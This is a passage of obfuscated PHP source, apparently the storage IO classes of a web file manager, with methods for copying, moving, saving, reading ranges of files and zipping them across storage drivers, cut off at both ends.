$¹ŞÊ“‰î, $úà˜ş˜¤); Hook::trigger($ŠŸ’ÆÍ[1138] . $¹ŞÊ“‰î . $ŠŸ’ÆÍ[1141], $İ¥™±äœ, $Ã¿äšÅÉ); return $Ã¿äšÅÉ; } public static function saveFile($ÈÃ¼Í›ú, $¤ÖÛêÜ, $†ÛœŠÀ‡ = true) { $¦Ü«ÈŠÓ =& $_SERVER[ĞÆÏ¡Îª]; $ŠÜâ¥å = self::info($¤ÖÛêÜ); $É†š³„¹ = self::driverMake($ÈÃ¼Í›ú); $ï„íÕ÷ = self::driverMake($¤ÖÛêÜ); $§Ä§°» = !1; if ($ï„íÕ÷->pathParse[$¦Ü«ÈŠÓ[1142]]) { $§Ä§°» = $ï„íÕ÷; $ÈóÀéé = $ï„íÕ÷->pathParse[$¦Ü«ÈŠÓ[1142]]; $ï„íÕ÷ = self::driverMake($ÈóÀéé); } if ($É†š³„¹->pathParse[$¦Ü«ÈŠÓ[1142]]) { $îÖÌ­Ïè = $É†š³„¹->pathParse[$¦Ü«ÈŠÓ[1142]]; $É†š³„¹ = self::driverMake($îÖÌ­Ïè); } $£ÌˆÀ©× = $ï„íÕ÷->pathFather($¤ÖÛêÜ); $Ï¬ê÷İ = !0; if (!$†ÛœŠÀ‡ && self::driverIsSame($É†š³„¹, $ï„íÕ÷)) { $Ï¬ê÷İ = !1; } $Ôğ†ë™ø = self::copyFile($É†š³„¹, $ÈÃ¼Í›ú, $ï„íÕ÷, $£ÌˆÀ©×, $ŠÜâ¥å[$¦Ü«ÈŠÓ[32]], $Ï¬ê÷İ); if ($§Ä§°») { $Ôğ†ë™ø = $§Ä§°»->getPathOuter($Ôğ†ë™ø); } return $Ôğ†ë™ø; } private static function copyMove($æúÑƒùÅ, $·‹‹†Ä¦, $ÏúæØ¬á, $ú¨„Æ¤«, $ÍÖ­¸‰ = false) { $½ÓĞã² =& $_SERVER[ĞÆÏ¡Îª]; if (!$æúÑƒùÅ || $æúÑƒùÅ == $½ÓĞã²[8] || !$·‹‹†Ä¦) { return !1; } ignore_timeout(); $îÛ÷µÉô = self::driverMake($æúÑƒùÅ); $í¿ó‡·µ = self::driverMake($·‹‹†Ä¦); $¿øœØê = $ú¨„Æ¤« == $½ÓĞã²[566]; $ıó«’‚‚ = !1; if ($í¿ó‡·µ->pathParse[$½ÓĞã²[1142]]) { $ıó«’‚‚ = $í¿ó‡·µ; $·‹‹†Ä¦ = $í¿ó‡·µ->pathParse[$½ÓĞã²[1142]]; $í¿ó‡·µ = self::driverMake($·‹‹†Ä¦); } if ($îÛ÷µÉô->pathParse[$½ÓĞã²[1142]]) { $æúÑƒùÅ = $îÛ÷µÉô->pathParse[$½ÓĞã²[1142]]; $îÛ÷µÉô = self::driverMake($æúÑƒùÅ); } self::check($îÛ÷µÉô, $æúÑƒùÅ, $í¿ó‡·µ, $·‹‹†Ä¦); Hook::trigger($½ÓĞã²[1143], $îÛ÷µÉô, $æúÑƒùÅ, $í¿ó‡·µ, $·‹‹†Ä¦); $æš½ŸÏô = self::driverIsSame($îÛ÷µÉô, $í¿ó‡·µ); if ($æš½ŸÏô) { if ($ú¨„Æ¤« == $½ÓĞã²[566] && !method_exists($í¿ó‡·µ, $½ÓĞã²[1144]) && trim($·‹‹†Ä¦, $½ÓĞã²[8]) == trim($í¿ó‡·µ->pathFather($æúÑƒùÅ), $½ÓĞã²[8])) { if ($îÛ÷µÉô->pathThis($æúÑƒùÅ) != $ÍÖ­¸‰ && !$îÛ÷µÉô->isTypeObject()) { return $îÛ÷µÉô->rename($æúÑƒùÅ, $ÍÖ­¸‰); } return $í¿ó‡·µ->getPathOuter($æúÑƒùÅ); } if (method_exists($í¿ó‡·µ, $ú¨„Æ¤«)) { return $í¿ó‡·µ->{$ú¨„Æ¤«}($æúÑƒùÅ, $·‹‹†Ä¦, $ÏúæØ¬á, $ÍÖ­¸‰); } } if ($æš½ŸÏô && $ú¨„Æ¤« == $½ÓĞã²[566] && $í¿ó‡·µ->getType() == $½ÓĞã²[106]) { $šóÜ¤ŠÔ = $í¿ó‡·µ->movePath($æúÑƒùÅ, $·‹‹†Ä¦, $ÍÖ­¸‰); if ($šóÜ¤ŠÔ) { return $šóÜ¤ŠÔ; } } $–„‰ô›ô = $îÛ÷µÉô->isFile($æúÑƒùÅ); if (!$–„‰ô›ô && $í¿ó‡·µ->getType() == $½ÓĞã²[753] && $îÛ÷µÉô->getType() == $½ÓĞã²[106]) { $šóÜ¤ŠÔ = $í¿ó‡·µ->copyFolderFromIO($îÛ÷µÉô, $æúÑƒùÅ, $·‹‹†Ä¦, $ÏúæØ¬á, $¿øœØê, $ÍÖ­¸‰); } else { $šóÜ¤ŠÔ = self::copyPath($îÛ÷µÉô, $æúÑƒùÅ, $í¿ó‡·µ, $·‹‹†Ä¦, $ÏúæØ¬á, $¿øœØê, $–„‰ô›ô, $ÍÖ­¸‰); } if ($šóÜ¤ŠÔ && $¿øœØê) { $îÛ÷µÉô->remove($æúÑƒùÅ); } if ($ıó«’‚‚) { $šóÜ¤ŠÔ = $ıó«’‚‚->getPathOuter($šóÜ¤ŠÔ); } return $šóÜ¤ŠÔ; } private static function check($°ÙÑ¹Ïû, $Åï†õÕ–, $ïúæîÄò, &$„î«Ìá¡) { $Í†×Ó— =& $_SERVER[ĞÆÏ¡Îª]; if (self::driverIsSame($°ÙÑ¹Ïû, $ïúæîÄò) && $°ÙÑ¹Ïû->isFolder($Åï†õÕ–) && $°ÙÑ¹Ïû->isParentOf($Åï†õÕ–, $„î«Ìá¡)) { show_json(LNG($Í†×Ó—[1145]), !1); } if (!$°ÙÑ¹Ïû->exist($Åï†õÕ–)) { show_json(LNG($Í†×Ó—[105]), !1); } } private static function copyPath($‹÷³¶Í¿, $• ìù¬„, $ÌšıÆÔµ, $²ÊşÅ¼‹, $¢ª­Š®ò, $–†ºØ•å, $îñ÷Í ˜, $ÒÕ·©ç¬ = false, $Õ²èõò· = true) { $Øì—šúß =& $_SERVER[ĞÆÏ¡Îª]; $öø³Ä½ = empty($ÒÕ·©ç¬) && $ÒÕ·©ç¬ !== $Øì—šúß[197] ? $‹÷³¶Í¿->pathThis($• ìù¬„) : $ÒÕ·©ç¬; if ($¢ª­Š®ò) { $‹øêæŒ¤ = $ÌšıÆÔµ->fileNameExist($²ÊşÅ¼‹, $öø³Ä½); $ô‘¶Ú‹¬ = $öø³Ä½; $öø³Ä½ = $ÌšıÆÔµ->fileNameAuto($²ÊşÅ¼‹, $öø³Ä½, $¢ª­Š®ò, !$îñ÷Í ˜); if (!$‹øêæŒ¤ || $ô‘¶Ú‹¬ != $öø³Ä½) { $¢ª­Š®ò = !1; } if ($Õ²èõò· && !$¢ª­Š®ò) { $ÌšıÆÔµ->_data[$Øì—šúß[1146]] = !0; } } if ($îñ÷Í ˜) { return self::copyFile($‹÷³¶Í¿, $• ìù¬„, $ÌšıÆÔµ, $²ÊşÅ¼‹, $öø³Ä½, $–†ºØ•å); } if ($¢ª­Š®ò == REPEAT_RENAME_FOLDER) { $¢ª­Š®ò = !1; } $ß¡óÎ§š = rtrim($²ÊşÅ¼‹, $Øì—šúß[8]) . $Øì—šúß[8] . $öø³Ä½; $š–œÈ ’ = $ÌšıÆÔµ->mkdir($ÌšıÆÔµ->getPath($ß¡óÎ§š), $¢ª­Š®ò); $²ÊşÅ¼‹ = $ÌšıÆÔµ->getPathInner($š–œÈ ’); $µÎ¥Åä = $‹÷³¶Í¿->listPath($• ìù¬„, !0); $µÎ¥Åä = is_array($µÎ¥Åä) ? $µÎ¥Åä : array($Øì—šúß[83] => array(), $Øì—šúß[82] => array()); $ùÓ†ôô = array_merge($µÎ¥Åä[$Øì—šúß[83]], $µÎ¥Åä[$Øì—šúß[82]]); foreach ($ùÓ†ôô as $¤Şª‹ş) { $–·Ùçé† = $¤Şª‹ş[$Øì—šúß[33]] == $Øì—šúß[199]; $• ìù¬„ = $‹÷³¶Í¿->getPathInner($¤Şª‹ş[$Øì—šúß[84]]); $ôµë°…Ï = self::copyPath($‹÷³¶Í¿, $• ìù¬„, $ÌšıÆÔµ, $²ÊşÅ¼‹, $¢ª­Š®ò, $–†ºØ•å, $–·Ùçé†, !1, !1); if (!$ôµë°…Ï) { IO::errorTips($Øì—šúß[1147] . $• ìù¬„ . $Øì—šúß[70] . $²ÊşÅ¼‹); } } self::copyMoveKeepInfo($‹÷³¶Í¿, $• ìù¬„, $š–œÈ ’); return $š–œÈ ’; } private static function copyFile($”“êíé·, $ØÇÎåŒ, $îÇ ÎûØ, $ÍòŒ ¹Ü, $Ñ·©ÏÑŠ, $ñ®üªìÀ) { $éÖã®ó¼ =& $_SERVER[ĞÆÏ¡Îª]; $ÍòŒ ¹Ü = $îÇ ÎûØ->getPath(rtrim($ÍòŒ ¹Ü, $éÖã®ó¼[8]) . $éÖã®ó¼[8] . $Ñ·©ÏÑŠ); $æóÊÕÕÔ = $éÖã®ó¼[1148] . time() . rand_string(5); Hook::trigger($éÖã®ó¼[1149], $”“êíé·, $ØÇÎåŒ, $îÇ ÎûØ, $ÍòŒ ¹Ü, $Ñ·©ÏÑŠ, $æóÊÕÕÔ); if (self::driverIsSame($”“êíé·, $îÇ ÎûØ)) { if ($ñ®üªìÀ) { $êßÎ€·Ï = $îÇ ÎûØ->moveFile($ØÇÎåŒ, $ÍòŒ ¹Ü); } else { $êßÎ€·Ï = $îÇ ÎûØ->copyFile($ØÇÎåŒ, $ÍòŒ ¹Ü); } Hook::trigger($éÖã®ó¼[1150], $”“êíé·, $ØÇÎåŒ, $îÇ ÎûØ, $ÍòŒ ¹Ü, $Ñ·©ÏÑŠ, $êßÎ€·Ï); self::copyMoveKeepInfo($”“êíé·, $ØÇÎåŒ, $êßÎ€·Ï); return $êßÎ€·Ï; } $“®ïûò = TEMP_FILES; if ($GLOBALS[$éÖã®ó¼[6]][$éÖã®ó¼[89]][$éÖã®ó¼[791]]) { $“®ïûò = $GLOBALS[$éÖã®ó¼[6]][$éÖã®ó¼[89]][$éÖã®ó¼[791]]; } $¾°şùÍ’ = $“®ïûò; mk_dir($¾°şùÍ’); $„†ò‰ú— = $¾°şùÍ’ . $æóÊÕÕÔ; $™ªŒƒËƒ = $„†ò‰ú—; $„†ò‰ú— = $”“êíé·->download($ØÇÎåŒ, $„†ò‰ú—); $„†ò‰ú— = $”“êíé·->iconvApp($„†ò‰ú—); if (substr($„†ò‰ú—, strlen($“®ïûò)) == $“®ïûò) { $ñ®üªìÀ = !0; } $êßÎ€·Ï = $îÇ ÎûØ->upload($ÍòŒ ¹Ü, $„†ò‰ú—, $ñ®üªìÀ); self::remove($™ªŒƒËƒ); Hook::trigger($éÖã®ó¼[1150], $”“êíé·, $ØÇÎåŒ, $îÇ ÎûØ, $ÍòŒ ¹Ü, $Ñ·©ÏÑŠ, $êßÎ€·Ï); self::copyMoveKeepInfo($”“êíé·, $ØÇÎåŒ, $êßÎ€·Ï); return $êßÎ€·Ï; } private static function copyMoveKeepInfo($„É™í½¼, $òûÇìŠ¤, $¡º¾º¥) { if (!$¡º¾º¥) { return; } $ôÛ½Ç†ß = $„É™í½¼->info($òûÇìŠ¤); if (!is_array($ôÛ½Ç†ß)) { return; } IO::setModifyTime($¡º¾º¥, $ôÛ½Ç†ß[$_SERVER[ĞÆÏ¡Îª][85]]); } public static function pathFather($°÷˜Ä¿É) { $»¸•…« = IO::init($°÷˜Ä¿É); $­şş­…È = $»¸•…«->pathFather($»¸•…«->path); return $»¸•…«->getPathOuter($­şş­…È); } public static function fileOut($æ¾³ŸØ°, $ÌÓº±ÑÕ = false, $¤ù¥ÉÙÀ = false, $ş•ÀÙşª = '') { $¦¹ˆÀÌ = self::driverMake($æ¾³ŸØ°); if ($¦¹ˆÀÌ->isFileOutServer()) { return $¦¹ˆÀÌ->fileOutServer($æ¾³ŸØ°, $ÌÓº±ÑÕ, $¤ù¥ÉÙÀ, $ş•ÀÙşª); } return $¦¹ˆÀÌ->fileOut($æ¾³ŸØ°, $ÌÓº±ÑÕ, $¤ù¥ÉÙÀ, $ş•ÀÙşª); } public static function fileOutImage($ø¶µ‰ó…, $õ‘Õ¨ñÃ = 250) { $÷ÉÊŒØš = array(250, 600, 1200, 2000, 3000, 5000); for ($ÌºÏ«Éš = 0; $ÌºÏ«Éš < count($÷ÉÊŒØš); $ÌºÏ«Éš++) { if ($ÌºÏ«Éš == 0 && $õ‘Õ¨ñÃ <= $÷ÉÊŒØš[$ÌºÏ«Éš]) { $õ‘Õ¨ñÃ = $÷ÉÊŒØš[$ÌºÏ«Éš]; break; } else { if ($õ‘Õ¨ñÃ > $÷ÉÊŒØš[$ÌºÏ«Éš - 1] && $õ‘Õ¨ñÃ <= $÷ÉÊŒØš[$ÌºÏ«Éš]) { $õ‘Õ¨ñÃ = $÷ÉÊŒØš[$ÌºÏ«Éš]; break; } else { if ($ÌºÏ«Éš == count($÷ÉÊŒØš) - 1 && $õ‘Õ¨ñÃ > $÷ÉÊŒØš[$ÌºÏ«Éš]) { $õ‘Õ¨ñÃ = $÷ÉÊŒØš[$ÌºÏ«Éš]; break; } } } } $¦‚½ú˜¼ = self::driverMake($ø¶µ‰ó…); if ($¦‚½ú˜¼->isFileOutServer()) { return $¦‚½ú˜¼->fileOutImageServer($ø¶µ‰ó…, $õ‘Õ¨ñÃ); } return $¦‚½ú˜¼->fileOutImage($ø¶µ‰ó…, $õ‘Õ¨ñÃ); } private static function driverIsSame($ÑƒÆá°Æ, $÷¾³åí…) { $œ´­¾ù¥ =& $_SERVER[ĞÆÏ¡Îª]; $ÏÈº¯§ = $ÑƒÆá°Æ->getType(); $¿ãÈæêÁ = $÷¾³åí…->getType(); if ($ÏÈº¯§ != $¿ãÈæêÁ) { return !1; } if ($ÏÈº¯§ == $œ´­¾ù¥[753]) { return !0; } if ($ÏÈº¯§ == $œ´­¾ù¥[106]) { return !0; } if ($ÑƒÆá°Æ->pathDriver == $÷¾³åí…->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÂßÓØÎå, $Íì¡µ­×) { $´é‰ÔÉ¸ =& $_SERVER[ĞÆÏ¡Îª]; if (!IO::exist($ÂßÓØÎå)) { return !1; } if (!IO::exist($Íì¡µ­×)) { IO::mkdir($Íì¡µ­×); } $àˆíÄ† = self::_listAll($ÂßÓØÎå); $¤¿«ùØ­ = self::_listAll($Íì¡µ­×); $¹²âëÑ¥ = array(); $Ø‘Õ±Ş = array(); foreach ($àˆíÄ† as $ØÒíãœ => $ù»ş¶ˆş) { if (isset($¤¿«ùØ­[$ØÒíãœ])) { if ($ù»ş¶ˆş[$´é‰ÔÉ¸[75]] == 1) { continue; } if ($¤¿«ùØ­[$ØÒíãœ][$´é‰ÔÉ¸[76]] == $ù»ş¶ˆş[$´é‰ÔÉ¸[76]]) { continue; } } if ($ù»ş¶ˆş[$´é‰ÔÉ¸[75]] == 1) { $Ø‘Õ±Ş[] = $Íì¡µ­× . $´é‰ÔÉ¸[8] . $ØÒíãœ; continue; } $°Š±Ô©Ö = strstr(trim($ØÒíãœ, $´é‰ÔÉ¸[8]), $´é‰ÔÉ¸[8]) ? get_path_father($ØÒíãœ) : $´é‰ÔÉ¸[12]; $¹²âëÑ¥[] = array($´é‰ÔÉ¸[1151] => $ù»ş¶ˆş[$´é‰ÔÉ¸[84]], $´é‰ÔÉ¸[1152] => rtrim($Íì¡µ­×, $´é‰ÔÉ¸[8]) . $´é‰ÔÉ¸[8] . $°Š±Ô©Ö, $´é‰ÔÉ¸[1153] => $ù»ş¶ˆş); } $—ş‘œ’¿ = array($´é‰ÔÉ¸[199] => $¹²âëÑ¥, $´é‰ÔÉ¸[75] => $Ø‘Õ±Ş); Hook::trigger($´é‰ÔÉ¸[1154], $ÂßÓØÎå, $Íì¡µ­×, $—ş‘œ’¿); foreach ($Ø‘Õ±Ş as $ù»ş¶ˆş) { IO::mkdir($ù»ş¶ˆş); } foreach ($¹²âëÑ¥ as $ù»ş¶ˆş) { IO::copy($ù»ş¶ˆş[$´é‰ÔÉ¸[1151]], $ù»ş¶ˆş[$´é‰ÔÉ¸[1152]], REPEAT_REPLACE); } } private static function _listAll($Š‰âµûı) { $ö¾Ó‰ñÆ =& $_SERVER[ĞÆÏ¡Îª]; $Š‰âµûı = KodIO::clear($Š‰âµûı); $ÙÔñºüÚ = IO::listAll($Š‰âµûı); foreach ($ÙÔñºüÚ as &$Ûá±ÌÃ) { $¯Šèİ»Ğ = substr($Ûá±ÌÃ[$ö¾Ó‰ñÆ[84]], strlen($Š‰âµûı)); $Ûá±ÌÃ[$ö¾Ó‰ñÆ[1155]] = trim($¯Šèİ»Ğ, $ö¾Ó‰ñÆ[8]); } unset($Ûá±ÌÃ); return array_to_keyvalue($ÙÔñºüÚ, $ö¾Ó‰ñÆ[1155]); } public static function fileSubstr($ášÙÑª¥, $œƒ–ƒÖ, $¶£ Ñ‰• = false) { $šµ—â½÷ =& $_SERVER[ĞÆÏ¡Îª]; $Ìë†Ç¶ş = self::driverMake($ášÙÑª¥); $–´ò¯¹¨ = $Ìë†Ç¶ş->size($ášÙÑª¥); $ëÍÌíŒÖ = $œƒ–ƒÖ; $àáêÑù = $¶£ Ñ‰•; if ($œƒ–ƒÖ < 0) { $œƒ–ƒÖ = $–´ò¯¹¨ + $œƒ–ƒÖ; } if ($¶£ Ñ‰• === !1) { $¶£ Ñ‰• = $–´ò¯¹¨ - $œƒ–ƒÖ; } if ($œƒ–ƒÖ + $¶£ Ñ‰• > $–´ò¯¹¨) { $¶£ Ñ‰• = $–´ò¯¹¨ - $œƒ–ƒÖ; } if (!$–´ò¯¹¨ && $Ìë†Ç¶ş->getType() == $šµ—â½÷[106] && !$Ìë†Ç¶ş->exist($ášÙÑª¥)) { $¦Âë¼Ø¶ = get_path_this($ášÙÑª¥); $€ËÇî× = parse_url_query($¦Âë¼Ø¶); if (is_array($€ËÇî×) && isset($€ËÇî×[$šµ—â½÷[32]])) { $¦Âë¼Ø¶ = urldecode($€ËÇî×[$šµ—â½÷[32]]); } throw new Exception($šµ—â½÷[1156] . LNG($šµ—â½÷[1157]) . $šµ—â½÷[957] . clear_html($¦Âë¼Ø¶) . $šµ—â½÷[12]); } if ($¶£ Ñ‰• <= 0) { return $šµ—â½÷[12]; } if ($œƒ–ƒÖ < 0 || $œƒ–ƒÖ >= $–´ò¯¹¨ || $¶£ Ñ‰• > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\145\122\145\141\144\40\145\162\162\x6f\x72\41\40\x73\x74\x61\x72\164\75{$œƒ–ƒÖ}\73\154\x65\156\147\164\150\75{$¶£ Ñ‰•}\x3b\40\x73\151\172\x65\75{$–´ò¯¹¨}\x3b"); } $¼á•Ñ¸“ = $Ìë†Ç¶ş->fileSubstr($ášÙÑª¥, $œƒ–ƒÖ, $¶£ Ñ‰•); if (!$¼á•Ñ¸“ && $¶£ Ñ‰• && isset($GLOBALS[$šµ—â½÷[1158]])) { throw new Exception($GLOBALS[$šµ—â½÷[1158]][$šµ—â½÷[1159]]); } return $¼á•Ñ¸“; } private static function driverMake(&$¦ÂÙëŠø) { $³¨‹ôı =& $_SERVER[ĞÆÏ¡Îª]; $ŞÉŸıÓ‚ = KodIO::parse($¦ÂÙëŠø); if (!self::$driverListSystem) { $Ó„áïÀÃ = Model($³¨‹ôı[762])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Ó„áïÀÃ, $³¨‹ôı[407]); } if ($ŞÉŸıÓ‚[$³¨‹ôı[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ŞÉŸıÓ‚[$³¨‹ôı[407]]]) { return !1; } $¦ÂÙëŠø = $ŞÉŸıÓ‚[$³¨‹ôı[1160]]; $ƒÇÕá®¥ = self::driverGet($ŞÉŸıÓ‚, $¦ÂÙëŠø); return $ƒÇÕá®¥; } private static function driverGet($š­ı¥°Ì, &$°Øñå»Ü) { $¶¬àù¡˜ =& $_SERVER[ĞÆÏ¡Îª]; $û‡´ŞÂë = $š­ı¥°Ì[$¶¬àù¡˜[1161]]; $¤÷·ÌÛé = $š­ı¥°Ì[$¶¬àù¡˜[407]]; switch ($š­ı¥°Ì[$¶¬àù¡˜[33]]) { case KodIO::KOD_IO: $´Å¹ª¬ = self::$driverListSystem[$¤÷·ÌÛé]; break; case KodIO::KOD_SOURCE: $°Øñå»Ü = $¤÷·ÌÛé . $°Øñå»Ü; $´Å¹ª¬ = array($¶¬àù¡˜[1162] => $¶¬àù¡˜[1163], $¶¬àù¡˜[6] => $š­ı¥°Ì); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $êçßëÃ = $GLOBALS[$¶¬àù¡˜[1164]]; self::$driverListUser = array_to_keyvalue($êçßëÃ, $¶¬àù¡˜[407]); } $´Å¹ª¬ = self::$driverListUser[$¤÷·ÌÛé]; break; case KodIO::KOD_SHARE_LINK: $´Å¹ª¬ = array($¶¬àù¡˜[1162] => $¶¬àù¡˜[1165], $¶¬àù¡˜[6] => $š­ı¥°Ì); $ÉÀ«¡ù = Action($¶¬àù¡˜[1166])->sharePathInfo($š­ı¥°Ì[$¶¬àù¡˜[84]]); $°Øñå»Ü = $ÉÀ«¡ù[$¶¬àù¡˜[411]]; if (!$ÉÀ«¡ù[$¶¬àù¡˜[411]]) { $‡¢ÃÏ— = Model($¶¬àù¡˜[610])->getInfo($ÉÀ«¡ù[$¶¬àù¡˜[498]]); $°Øñå»Ü = KodIO::clear($‡¢ÃÏ—[$¶¬àù¡˜[1167]] . $š­ı¥°Ì[$¶¬àù¡˜[1160]]); $š­ı¥°Ì[$¶¬àù¡˜[496]] = $‡¢ÃÏ—; $š­ı¥°Ì[$¶¬àù¡˜[1142]] = $°Øñå»Ü; $´Å¹ª¬ = array($¶¬àù¡˜[1162] => $¶¬àù¡˜[1168], $¶¬àù¡˜[6] => $š­ı¥°Ì); } break; case KodIO::KOD_SHARE_ITEM: $´Å¹ª¬ = array($¶¬àù¡˜[1162] => $¶¬àù¡˜[1169], $¶¬àù¡˜[6] => $š­ı¥°Ì); $‡¢ÃÏ— = Model($¶¬àù¡˜[610])->getInfo($š­ı¥°Ì[$¶¬àù¡˜[407]]); if ($‡¢ÃÏ—[$¶¬àù¡˜[411]] == $¶¬àù¡˜[197]) { $°Øñå»Ü = KodIO::clear($‡¢ÃÏ—[$¶¬àù¡˜[1167]] . $š­ı¥°Ì[$¶¬àù¡˜[1160]]); $š­ı¥°Ì[$¶¬àù¡˜[496]] = $‡¢ÃÏ—; $š­ı¥°Ì[$¶¬àù¡˜[1142]] = $°Øñå»Ü; $´Å¹ª¬ = array($¶¬àù¡˜[1162] => $¶¬àù¡˜[1170], $¶¬àù¡˜[6] => $š­ı¥°Ì); } else { if (!$°Øñå»Ü) { $°Øñå»Ü = $‡¢ÃÏ—[$¶¬àù¡˜[411]]; } } break; default: $°Øñå»Ü = $š­ı¥°Ì[$¶¬àù¡˜[84]]; $´Å¹ª¬ = array($¶¬àù¡˜[1162] => $¶¬àù¡˜[1171]); break; } $¼±Š”¹ä = $š­ı¥°Ì[$¶¬àù¡˜[84]]; if (!isset(self::$driverCache[$¼±Š”¹ä])) { $¬¬ØÄøï = strtolower($´Å¹ª¬[$¶¬àù¡˜[95]]); $ÁÌ®ê = $GLOBALS[$¶¬àù¡˜[6]][$¶¬àù¡˜[89]][$¶¬àù¡˜[821]]; $‚“í²ø = $¶¬àù¡˜[74] . (isset($ÁÌ®ê[$¬¬ØÄøï]) ? $ÁÌ®ê[$¬¬ØÄøï] : ucfirst($¬¬ØÄøï)); if (!class_exists($‚“í²ø)) { show_json("{$‚“í²ø}\40\x6e\x6f\164\40\145\x78\151\163\164\x73\x21", !1); } $ıÇ—Á‰Ç = isset($´Å¹ª¬[$¶¬àù¡˜[6]]) ? $´Å¹ª¬[$¶¬àù¡˜[6]] : !1; self::$driverCache[$¼±Š”¹ä] = new $‚“í²ø($ıÇ—Á‰Ç); } $©®«é‚ = self::$driverCache[$¼±Š”¹ä]; $©®«é‚->pathDriver = $û‡´ŞÂë; $©®«é‚->pathBase = $¶¬àù¡˜[12]; if (isset($´Å¹ª¬[$¶¬àù¡˜[6]][$¶¬àù¡˜[1172]])) { $©®«é‚->pathBase = rtrim($´Å¹ª¬[$¶¬àù¡˜[6]][$¶¬àù¡˜[1172]], $¶¬àù¡˜[8]) . $¶¬àù¡˜[8]; $°Øñå»Ü = $©®«é‚->pathBase . ltrim($°Øñå»Ü, $¶¬àù¡˜[8]); } $°Øñå»Ü = $©®«é‚->getPath($°Øñå»Ü); if (isset($š­ı¥°Ì[$¶¬àù¡˜[1142]])) { $°Øñå»Ü = $š­ı¥°Ì[$¶¬àù¡˜[1142]]; } $©®«é‚->path = $°Øñå»Ü; return $©®«é‚; } public static function errorTips($®‰Æ¬ú = false) { $ÇíÀ˜Ô =& $_SERVER[ĞÆÏ¡Îª]; static $»å¿ß´‹ = array(); $öÏ€É = 1000; if ($®‰Æ¬ú === -1) { return $»å¿ß´‹ ? $»å¿ß´‹[count($»å¿ß´‹) - 1] : $ÇíÀ˜Ô[12]; } if ($®‰Æ¬ú === !1) { return implode($ÇíÀ˜Ô[231], $»å¿ß´‹); } if (count($»å¿ß´‹) >= $öÏ€É) { $»å¿ß´‹ = array_slice($»å¿ß´‹, $öÏ€É * 0.5, $öÏ€É); } $»å¿ß´‹[] = $®‰Æ¬ú; write_log($ÇíÀ˜Ô[162] . ACTION . $ÇíÀ˜Ô[1173] . $®‰Æ¬ú, $ÇíÀ˜Ô[1174]); } public static function getLastError($¡Ãã£µª = '') { $¤ÕÚÒé = self::errorTips(-1); return $¤ÕÚÒé ? $¤ÕÚÒé : $¡Ãã£µª; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $“£´©…˜; if (!$“£´©…˜) { $Î‡ë€Ï¢ = IO::init($_SERVER[ĞÆÏ¡Îª][8]); } return $Î‡ë€Ï¢; } private static function iconvSystem($´ß»‘Ê) { return self::local()->iconvSystem($´ß»‘Ê); } private static function iconvApp($ï‡Ì®¶é) { return self::local()->iconvApp($ï‡Ì®¶é); } public static function zip($„êÖ˜’Ó, $ˆ´ÚÌ½ = "\x7a\x69\x70", $’¡Ì­Ç = '', $¼èèùÛ› = REPEAT_RENAME) { $´Üø¤Êˆ =& $_SERVER[ĞÆÏ¡Îª]; $¦‚ô³÷Ú = self::init($„êÖ˜’Ó[0][$´Üø¤Êˆ[84]]); $·¿—È¿ì = self::info($„êÖ˜’Ó[0][$´Üø¤Êˆ[84]]); $† ×áß = !1; if (!$’¡Ì­Ç && $¦‚ô³÷Ú->getType() == $´Üø¤Êˆ[106]) { $ø¦š¼” = self::zipFileList($„êÖ˜’Ó); } else { $† ×áß = $’¡Ì­Ç ? $’¡Ì­Ç : TEMP_FILES . $´Üø¤Êˆ[1175] . time() . rand_string(8) . $´Üø¤Êˆ[8]; mk_dir($† ×áß); $ø¦š¼” = self::zipFileList($„êÖ˜’Ó, $† ×áß); } $òüöƒù€ = $·¿—È¿ì[$´Üø¤Êˆ[32]]; if (count($ø¦š¼”) > 1) { $ÎŠµ‚œ = IO::info(IO::pathFather($·¿—È¿ì[$´Üø¤Êˆ[84]])); $òüöƒù€ = $ÎŠµ‚œ[$´Üø¤Êˆ[32]]; } $öĞó«­ø = $† ×áß; if (!$öĞó«­ø) { $öĞó«­ø = get_path_father($·¿—È¿ì[$´Üø¤Êˆ[84]]); if (!$’¡Ì­Ç && $¦‚ô³÷Ú->getType() == $´Üø¤Êˆ[106]) { $öĞó«­ø = get_path_father($¦‚ô³÷Ú->path); } $ö“Á†ùÆ = IO::info($öĞó«­ø); if (!$ö“Á†ùÆ[$´Üø¤Êˆ[202]]) { show_json(LNG($´Üø¤Êˆ[1176]), !1); } } $®‘Šöæ = $öĞó«­ø . $òüöƒù€ . $´Üø¤Êˆ[10] . $ˆ´ÚÌ½; $®‘Šöæ = get_filename_auto($®‘Šöæ, $´Üø¤Êˆ[12], $¼èèùÛ›); $ÙÛ€Ú¿© = self::iconvSystem($®‘Šöæ); foreach ($ø¦š¼” as $Ê”™äš  => $ÆÊù€ä) { $ø¦š¼”[$Ê”™äš ] = self::iconvSystem($ÆÊù€ä); } KodArchive::create($ÙÛ€Ú¿©, $ø¦š¼”); if (!IO::exist($®‘Šöæ)) { if ($† ×áß) { del_dir($† ×áß); } show_json(LNG($´Üø¤Êˆ[1177]), !1); } if ($’¡Ì­Ç || !$† ×áß) { if ($† ×áß && strstr($† ×áß, TEMP_FILES)) { $½·²šÉ = $ø¦š¼” = array(); recursion_dir($öĞó«­ø, $½·²šÉ, $ø¦š¼”, 0); foreach ($½·²šÉ as $ â¸ÊÌİ) { del_dir($ â¸ÊÌİ); } foreach ($ø¦š¼” as $® ÛÈˆ×) { if ($® ÛÈˆ× == $ÙÛ€Ú¿©) { continue; } del_file($® ÛÈˆ×); } } return $®‘Šöæ; } $ÓŒÎè» = self::pathFather($·¿—È¿ì[$´Üø¤Êˆ[84]]); $ôó€Ú¿ = self::move($®‘Šöæ, $ÓŒÎè», $¼èèùÛ›); if (!$ôó€Ú¿) { del_dir($† ×áß); show_json(LNG($´Üø¤Êˆ[1177]), !1); } del_dir($† ×áß); return $ôó€Ú¿; } public static function unzip($é¥ı¥¨œ, $ààæ©ô‰ = "\x72\145\x70\x6c\141\143\x65") { $¼Á¢ï² =& $_SERVER[ĞÆÏ¡Îª]; $ß•ÚŞäµ = $é¥ı¥¨œ[$¼Á¢ï²[84]]; $š¾³Ş‰š = $é¥ı¥¨œ[$¼Á¢ï²[1178]]; if (!($ÓÈœàğÍ = parent::info($ß•ÚŞäµ))) { show_json(LNG($¼Á¢ï²[1179]), !1); } if (!($ä§½§» = parent::infoFull($š¾³Ş‰š))) { 